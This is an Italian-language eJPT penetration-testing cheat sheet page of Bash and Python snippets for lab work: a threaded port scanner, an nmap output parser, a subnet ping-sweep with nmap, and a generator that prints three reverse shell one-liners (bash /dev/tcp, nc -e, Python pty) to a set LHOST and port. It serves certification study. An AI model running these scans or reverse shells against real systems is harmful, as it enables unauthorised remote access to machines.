---
layout: cheatsheet
cert: ejpt
cert_label: "eJPT"
title: "Scripting Snippets"
permalink: "/cheatsheet/ejpt/11-tools-reference/scripting-snippets/"
section: "Tools Reference"
section_order: 11
order: 50
sort_key: 1150
---

**Difficoltà:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [00-Fundamentals/03-Linux-Fundamentals.md](/cheatsheet/ejpt/00-fundamentals/03-linux-fundamentals/)
**Lab:** riferimento trasversale

---

## Obiettivo

Ci sono compiti che rifai così tante volte durante un lab, scansionare una subnet intera, tirare fuori IP e porte da un output nmap, generare l'ennesimo one-liner di reverse shell, che a un certo punto conviene smettere di riscriverli da zero ogni volta. Questi sono gli snippet Bash/Python che tornano utili più spesso: copiali, adattali ai tuoi IP/porte e vai avanti.

---

## Python: scanner porte rapido con socket

```python
import socket
from concurrent.futures import ThreadPoolExecutor

target = "10.10.10.5"
ports = range(1, 1025)

def scan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] {target}:{port} aperta")
    s.close()

with ThreadPoolExecutor(max_workers=200) as pool:
    pool.map(scan, ports)
```

Torna utile quando nmap non è disponibile, o quando vuoi restare più silenzioso del fingerprint che nmap lascia dietro di sé: qui è puro connect scan via socket TCP.

## Python: parser output nmap (grepable -oG)

```python
import re

with open("scan-allports.txt") as f:
    for line in f:
        if "Ports:" not in line:
            continue
        ip = line.split()[1]
        open_ports = re.findall(r"(\d+)/open", line)
        if open_ports:
            print(f"{ip}: {', '.join(open_ports)}")
```

Legge l'output generato con `nmap -oG scan-allports.txt` e in un attimo tira fuori IP e porte aperte: comodo quando hai più host e vuoi una tabella riassuntiva invece di scorrere un file grezzo riga per riga.

## Bash: loop enumeration su range IP

```bash
for ip in $(seq 1 254); do
  target="10.10.10.$ip"
  if ping -c1 -W1 "$target" &>/dev/null; then
    echo "[+] $target live"
    nmap -sV -T4 --top-ports 20 -oN "scan-$target.txt" "$target" &
  fi
done
wait
```

Ping sweep più scan rapido delle porte più comuni, tutto in parallelo su un'intera subnet: un buon modo per farti un'idea veloce di una rete lab con molti host senza aspettare che nmap finisca un host alla volta.

## Bash: generatore reverse shell one-liner al volo

```bash
lhost="10.10.14.5"
lport="4444"
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
echo "nc -e /bin/sh $lhost $lport"
echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawne(\"/bin/sh\")'"
```

Piccolo helper per smettere di ridigitare IP e porta ogni volta che ti serve una reverse shell: stampa le varianti più comuni già pronte con i tuoi valori LHOST/LPORT.

---

## Connessioni

- **Prerequisito:** [00-Fundamentals/03-Linux-Fundamentals.md](/cheatsheet/ejpt/00-fundamentals/03-linux-fundamentals/)
- **Combinazione con:** [02-Footprinting-Scanning/01-Nmap-Fundamentals.md](/cheatsheet/ejpt/02-footprinting-scanning/01-nmap-fundamentals/), [08-Exploitation-PostEx/02-Reverse-Bind-Shells.md](/cheatsheet/ejpt/08-exploitation-postex/02-reverse-bind-shells/)
